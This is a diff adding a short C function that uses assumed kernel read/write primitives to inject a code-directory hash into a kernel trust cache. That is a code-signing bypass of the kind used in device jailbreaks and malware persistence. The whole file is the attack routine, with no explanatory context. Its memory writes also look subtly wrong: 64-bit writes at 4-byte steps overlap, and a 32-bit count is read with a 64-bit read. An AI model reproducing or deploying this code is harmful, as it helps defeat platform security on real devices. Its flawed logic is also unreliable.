@@ -1,0 +1,21 @@
+#include <stdio.h>
+#include <stdint.h>
+#include <string.h>
+
+extern uint64_t kread64(uint64_t addr);
+extern void kwrite64(uint64_t addr, uint64_t val);
+extern uint64_t get_trust_cache_base();
+
+int inject_cdhash_into_trust_cache(uint8_t *cdhash) {
+    uint64_t tc_base = get_trust_cache_base();
+    if (!tc_base) return -1;
+    uint32_t num_hashes = (uint32_t)kread64(tc_base + 12);
+    uint64_t new_hash_addr = tc_base + 16 + (num_hashes * 20);
+    for (int i = 0; i < 5; i++) {
+        uint32_t chunk;
+        memcpy(&chunk, cdhash + (i * 4), 4);
+        kwrite64(new_hash_addr + (i * 4), chunk);
+    }
+    kwrite64(tc_base + 12, num_hashes + 1);
+    return 0;
+}
